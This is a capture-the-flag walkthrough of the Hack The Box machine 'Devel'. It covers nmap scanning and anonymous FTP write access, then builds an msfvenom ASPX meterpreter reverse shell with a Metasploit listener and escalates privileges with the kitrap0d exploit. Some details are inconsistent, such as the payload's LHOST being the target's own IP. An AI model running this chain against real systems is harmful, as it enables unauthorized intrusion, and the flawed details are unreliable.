![logo](/logo.png)

# [DEVEL- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was reeleased on 15 Mar 2017 as the third machine on HTB,Devel created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *Ftp 
  *IIS httpd 7.5
  *Windows
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/devel 10.10.10.5
```

###### Output 

![](/Windows/Windows-Easy/Devel/Screenshots/namapdevel.png)

```sh
nmap -sV -sC -oA nmap/devel 10.10.10.5                                                                                            ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 11:55 EAT
Nmap scan report for 10.10.10.5
Host is up (0.37s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.46 seconds
```

looking at the results we find out that their are 2 ports open and the machine is a windows operating system. 

port[21]-ftp
port[80]-https

`N/B` - We also notice that `ftp` allows anonymous login which we can login to the service with this credentials `anonymous:anonymous` and `port:80` is running an `iis httpd 7.5` .

#### FTP

###### code

```sh
ftp 10.10.10.5  
```

###### output

![](/Windows/Windows-Easy/Devel/Screenshots/ftpdevel.png)

Attempting to connect anonymously via FTP reveals that the server does allow anonymous login
with `read/write privileges` in the `IIS server directory`.

# Exploitation 

Because of `read and write` privillage we can be able to drop an `aspx` reverse shell on the target in the directory and execute it by browsing to the file via a web server.`Active Server Page Extended` (`ASPX`) is a file type/extension written for [Microsoft's ASP.NET Framework](https://docs.microsoft.com/en-us/aspnet/overview). On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML. We can take advantage of this by using an ASPX-based web shell to control the underlying Windows operating system. Let's witness this first-hand by utilizing the `Antak Webshell`.

we now use `msfvenom` to create an exploit inform of an `aspx` file and put it to the server via `ftp` 

###### code

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4445 -f aspx
> devel.aspx
```

###### output
![](/Windows/Windows-Easy/Devel/Screenshots/msfvenomdevel.png)

After creating the `aspx` exploit we can then  upload it to the server using ftp  via `put command`

###### code

```sh
put ./devel.aspx
```

###### output

![](/Windows/Windows-Easy/Devel/Screenshots/putdevel.png)

We then start a listener in Metasploit,

###### code 

```sh
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.4
set LPORT 4445
set ExitOnSession false
exploit -j
```

###### output
![](/Windows/Windows-Easy/Devel/Screenshots/msfconsoledevel.png)

Then we navigate to the browser by browsing [http://10.10.10.5/devel.aspx](http://10.10.10.5/devel.aspx) will trigger
the reverse shell

###### output

![](/Windows/Windows-Easy/Devel/Screenshots/shelldevel.png)

By default, the working directory is set to `c:\windows\system32\inetsrv`, which the `IIS user ` does not have write permissions for. Navigating to `c:\windows\TEMP` is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation.

###### output

![](/Windows/Windows-Easy/Devel/Screenshots/tempdevel.png)

# Privillage Escalation
Running `systeminfo` reveals that the target is x86 architecture, so it is possible to get fairly reliable suggestions with the local_exploit_suggester module. The same can
not be said for running the module on x64.

![](/Windows/Windows-Easy/Devel/Screenshots/systeminfodevel.png)

Now we exit then we go back to background the session and search for `suggester`


![](/Windows/Windows-Easy/Devel/Screenshots/suggestdevel.png)
###### code 

```sh
use 0
options
sessions
set SESSIONS 4
run
```

###### output

![](/Windows/Windows-Easy/Devel/Screenshots/sessiondevel.png)

Running the suggester gives the following recommended escalation modules:

![](/Windows/Windows-Easy/Devel/Screenshots/moduledevel.png)

```sh
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

```

![](/Windows/Windows-Easy/Devel/Screenshots/potentialdevel.png)

Going down the list, `bypassauc_eventvwr` fails due to the IIS user not being a part of the
administrators group, which is the default and to be expected. The second option,
`ms10_015_kitrap0d`, does the trick.

###### code

```sh
use exploit/windows/local/ms10_015_kitrap0d
options
sessions
set SESSION 7
run
```

###### output

![](/Windows/Windows-Easy/Devel/Screenshots/kitproddevel.png)
![](/Windows/Windows-Easy/Devel/Screenshots/session2devel.png)

The exploit works and triggers another meterpreter sessions which  when load the session we check the `whoami` is logged in as root

![](/Windows/Windows-Easy/Devel/Screenshots/rootdevel.png)

The flags can now be obtained from `c:\Users\babis\Desktop\user.txt` and `c:\Users\Administrator\Desktop\root.txt` 

![](/Windows/Windows-Easy/Devel/Screenshots/flagsdevel.png)

	-------------------------END successful attack @lesley----------------------
